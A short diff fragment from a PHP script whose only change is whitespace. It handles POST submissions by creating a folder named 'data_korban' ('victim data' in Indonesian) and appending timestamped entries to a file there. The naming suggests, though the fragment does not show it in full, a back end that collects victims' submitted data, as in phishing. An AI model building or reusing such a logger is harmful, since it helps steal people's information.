@@ -14,7 +14,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             die("Gagal membuat folder data_korban");
         }
     }
-
+    
     $file = fopen($filepath, "a");
     if ($file) {
         $waktu = date("Y-m-d H:i:s");
